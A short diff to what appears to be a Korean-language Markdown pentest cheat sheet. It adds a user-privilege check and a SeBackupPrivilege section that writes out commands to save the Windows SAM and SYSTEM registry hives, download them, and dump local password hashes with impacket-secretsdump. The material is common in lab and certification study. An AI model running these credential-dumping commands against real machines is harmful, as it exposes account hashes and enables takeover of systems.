@@ -30,9 +30,17 @@ Get-Process | Where-Object { $_.ProcessName -match "wevtutil" }
 
 ## powershell 유저 권한 확인
 ```powershell
-
+whoami /all
 ```
 
+## SeBackupPrivilege
+```powershell
+reg.exe save hklm\sam sam
+reg.exe save hklm\system system
+download sam
+download system
+#impacket-secretsdump -sam sam -system system LOCAL
+```
 
 
 # Linux
